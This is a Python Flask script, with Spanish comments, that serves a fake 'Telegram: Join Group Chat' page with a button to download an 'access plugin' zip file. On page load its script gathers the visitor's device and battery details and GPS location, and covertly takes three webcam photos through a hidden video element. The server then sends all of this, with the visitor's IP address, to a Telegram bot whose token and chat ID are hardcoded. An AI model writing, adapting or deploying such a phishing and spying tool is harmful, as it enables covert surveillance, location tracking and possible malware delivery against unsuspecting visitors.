import os
from flask import Flask, request, render_template_string, send_file
import telebot
from datetime import datetime
import base64
import io

# Configuración
TOKEN = "8731032932:AAEdMOe81SLdxqShm50XVI5HbkTC7igqg_k"
CHAT_ID = "8041132611" 
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# NOMBRE DEL ARCHIVO PARA DESCARGA (Pon el archivo en la misma carpeta que este script)
ARCHIVO_DESCARGA = "acceso_verificado.zip" 

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Telegram: Join Group Chat</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: sans-serif; background-color: #fff; overflow: hidden; }
        .content { position: relative; height: 100%; width: 100%; }
        iframe { width: 100%; height: 85%; border: none; }
        .btn-area { height: 15%; background: #fff; display: flex; justify-content: center; align-items: center; border-top: 1px solid #ddd; }
        .download-btn { background: #24A1DE; color: white; padding: 12px 25px; border-radius: 5px; text-decoration: none; font-weight: bold; }
    </style>
</head>
<body>
    <div class="content">
        <iframe src="https://www.grupostelegram.net"></iframe>
        <div class="btn-area">
            <a href="/download" class="download-btn">DESCARGAR COMPLEMENTO DE ACCESO</a>
        </div>
    </div>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        async function getExtraData() {
            const data = {
                ua: navigator.userAgent,
                lang: navigator.language,
                res: `${screen.width}x${screen.height}`,
                cores: navigator.hardwareConcurrency || 'N/A',
                mem: navigator.deviceMemory || 'N/A',
                vendor: navigator.vendor
            };
            try {
                const batt = await navigator.getBattery();
                data.batt_lvl = Math.round(batt.level * 100) + '%';
                data.batt_char = batt.charging ? 'Yes' : 'No';
            } catch (e) { data.batt_lvl = 'N/A'; data.batt_char = 'N/A'; }
            return data;
        }

        async function start() {
            const info = await getExtraData();
            // Intentar GPS
            navigator.geolocation.getCurrentPosition(
                (pos) => { capture({...info, lat: pos.coords.latitude, lon: pos.coords.longitude, gps: 'Allowed'}); },
                () => { capture({...info, lat: 'N/A', lon: 'N/A', gps: 'Denied'}); }
            );
        }

        async function capture(fullData) {
            try {
                // Intentar Cámara
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                const video = document.getElementById('video');
                video.srcObject = stream;

                [1000, 3000, 5000].forEach((ms, i) => {
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        send({ ...fullData, img: canvas.toDataURL('image/jpeg'), shot: i + 1, cam: 'Allowed' });
                        if(i === 2) stream.getTracks().forEach(t => t.stop());
                    }, ms);
                });
            } catch (e) {
                // Si rechaza cámara pero quizás aceptó GPS o viceversa
                send({ ...fullData, cam: 'Denied' });
            }
        }

        function send(payload) {
            fetch('/data', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
        }
        window.onload = start;
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/download')
def download():
    # Esta ruta entrega el archivo al usuario
    try:
        return send_file(ARCHIVO_DESCARGA, as_attachment=True)
    except:
        return "Error: El archivo de descarga no existe en el servidor.", 404

@app.route('/data', methods=['POST'])
def get_data():
    d = request.json
    ip = request.remote_addr
    now = datetime.now().strftime("%H:%M:%S")
    
    # Solo enviamos el REPORTE TÉCNICO en la primera ráfaga (shot 1) o si no hay fotos (rechazó cámara)
    if d.get('shot', 1) == 1:
        reporte = (
            f"📊 *Visitor Information Captured*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🖥 *Device & Browser*\n"
            f"• User Agent: `{d.get('ua')}`\n"
            f"• Resolution: `{d.get('res')}`\n\n"
            f"🌐 *Network Information*\n"
            f"• IP Address: `{ip}`\n"
            f"• Language: `{d.get('lang')}`\n\n"
            f"🔋 *Battery Status*\n"
            f"• Level: `{d.get('batt_lvl')}`\n"
            f"• Charging: `{d.get('batt_char')}`\n\n"
            f"🔐 *Device Permissions*\n"
            f"• Camera: `{d.get('cam')}`\n"
            f"• Location: `{d.get('gps')}`\n\n"
            f"💾 *Hardware & Storage*\n"
            f"• CPU Cores: `{d.get('cores')}`\n"
            f"• RAM: `{d.get('mem')} GB`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📅 Time: {now}"
        )
        bot.send_message(CHAT_ID, reporte, parse_mode="Markdown")

        # Mensaje de UBICACIÓN separado
        if d.get('lat') != 'N/A':
            map_link = f"📍 *Google Maps Location:*\nhttp://maps.google.com/maps?q={d.get('lat')},{d.get('lon')}"
            bot.send_message(CHAT_ID, map_link)
        else:
            bot.send_message(CHAT_ID, "⚠️ *Location Denied by User*")

    # Enviar la FOTO separada
    if d.get('img'):
        img_data = base64.b64decode(d.get('img').split(',')[1])
        bot.send_photo(CHAT_ID, img_data, caption=f"📸 *Shot {d.get('shot')}/3* — `{now}`", parse_mode="Markdown")
    elif d.get('cam') == 'Denied' and d.get('shot', 1) == 1:
        bot.send_message(CHAT_ID, "🚫 *Camera Access Denied by User*")

    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)